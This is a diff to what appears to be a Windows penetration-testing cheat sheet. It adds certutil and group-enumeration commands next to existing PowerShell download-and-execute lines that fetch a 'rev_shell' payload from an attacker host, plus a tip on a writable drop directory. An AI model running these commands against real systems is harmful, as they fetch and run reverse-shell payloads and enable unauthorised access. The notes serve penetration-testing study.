@@ -28,6 +28,7 @@
 	whoami /all
 	net user		Print all users
 	net localgroup		Print all groups
+	net localgroup administrators
 	net localgroup <groupname>		Prints information of group
 	tasklist /svc		Gives a better idea of what applications are running on the system. Prints the name of executables and services running
 		https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist
@@ -170,6 +171,14 @@ Use impacket-wmiexec with rpc port 135:
 Download and execute file using powershell:
 
 	powershell -c 'IEX(New-Object Net.WebClient).downloadstring("http://<localhostip>/rev_shell")'
+
+Download file:
+
+	certutil.exe -urlcache -f http://<localhostip>/rev_shell <path_to_where_file_is_gonna_be_saved>
+
+Good dir to save, download and write files:
+
+	C:\Users\Public\
 
 ## More info
 
